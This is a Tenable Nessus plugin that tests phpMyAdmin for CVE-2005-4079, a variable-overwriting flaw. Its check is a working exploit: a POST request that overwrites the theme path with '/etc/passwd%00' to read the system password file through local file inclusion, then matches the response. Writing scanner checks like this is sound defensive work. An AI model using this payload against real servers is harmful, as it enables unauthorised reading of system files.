#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22124);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-4079");
  script_bugtraq_id(15761);
  script_xref(name:"OSVDB", value:"21508");

  script_name(english:"phpMyAdmin import_blacklist Variable Overwriting");
  script_summary(english:"Tries to read a local file using phpMyAdmin");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The version of phpMyAdmin installed on the remote host fails to
properly protect the global 'import_blacklist' variable, which is used
in the 'libraries/grab_globals.lib.php' script to protect global
variables in its register_globals emulation layer.  An unauthenticated
attacker can exploit this flaw to overwrite arbitrary variables,
thereby opening the application up to remote / local file include as
well as cross-site scripting attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_252005.110.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2005-12/0247.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-9" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyAdmin version 2.7.0-pl1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );
script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/css/phpmyadmin.css.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("li#li_pma_homepage" >< res)
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd%00";
    postdata = string(
      "usesubform[1]=&",
      "subform[1][GLOBALS][cfg][ThemePath]=", file
    );
    r = http_send_recv3(method: "POST ", version: 11, port: port,
      item: string(url, "?import_blacklist[0]=/", SCRIPT_NAME, "/"),
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = strstr(res, "img.lightbulb");
        if (contents) contents = strstr(contents, "}");
        if (contents) contents = contents - "}";
      }

      if (contents)
        report = string(
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = NULL;

      security_warning(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
